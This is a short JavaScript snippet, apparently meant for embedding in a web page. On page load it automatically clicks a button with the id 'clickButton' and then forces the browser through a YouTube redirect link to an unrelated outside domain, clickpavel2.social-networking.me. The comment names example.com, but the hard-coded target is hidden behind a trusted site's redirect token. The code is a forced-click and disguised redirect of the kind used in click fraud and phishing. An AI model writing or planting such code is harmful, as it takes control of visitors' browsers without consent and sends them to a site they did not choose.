// Always automatically click the button and redirect to another webpage
window.onload = function() {
    var button = document.getElementById("clickButton");
    if (button) {
        button.click();
        // Replace 'https://example.com' with your desired destination URL
        window.location.href = "https://www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbkwzZEwyalNIdDRMdnpNclVpQ3hPeDB6bDM0UXxBQ3Jtc0trRVpyWlljU0xnaWozc3BVT3R3SndWclowdzBaRnU3cXVGMTBkSWVxY2lfUGtPLVZLT2RtZmJFdU9QZjhuamlkeHVfVFhvbkNDRU5rOEh5MDhzS2IzNWIzMVp3Qy1nemdCRHlMd0pVem1HZUFCSXM4SQ&q=http%3A%2F%2Fclickpavel2.social-networking.me%2F&html_redirect=1 ";
    }
};
